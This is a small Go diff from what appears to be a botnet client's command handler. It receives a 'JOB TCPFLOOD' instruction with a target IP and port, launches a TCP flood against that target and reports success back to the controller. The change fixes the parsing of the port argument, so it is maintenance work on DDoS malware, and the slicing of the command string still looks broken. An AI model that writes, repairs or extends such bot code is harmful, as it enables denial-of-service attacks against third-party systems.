@@ -70,8 +70,9 @@ func main() {
 			// splits after JOB TCPFLOOD
 			// eg JOBTCPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
 			splits := strings.Split(cleanedResult[:13], " ")
+			port, _ := strconv.Atoi(splits[1])
 
-			jobs.TCPFlood(splits[0], strconv.Atoi(splits[1]))
+			jobs.TCPFlood(splits[0], port)
 
 			conn.Write([]byte("JOB SUCC \r\n"))
 			state = 4
